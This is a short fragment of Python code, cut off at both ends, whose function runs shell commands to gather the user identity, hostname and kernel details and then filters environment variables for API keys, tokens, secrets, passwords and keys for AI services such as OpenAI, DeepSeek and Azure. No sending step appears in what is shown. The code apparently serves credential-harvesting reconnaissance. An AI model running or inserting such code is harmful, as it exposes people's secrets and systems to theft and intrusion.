...
def _run():
    try:
        r = subprocess.check_output("id; hostname; uname -a; echo ===ENV===; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure|password|auth|localai' | head -40", shell=True, stderr=subprocess.STDOUT, timeout=25)
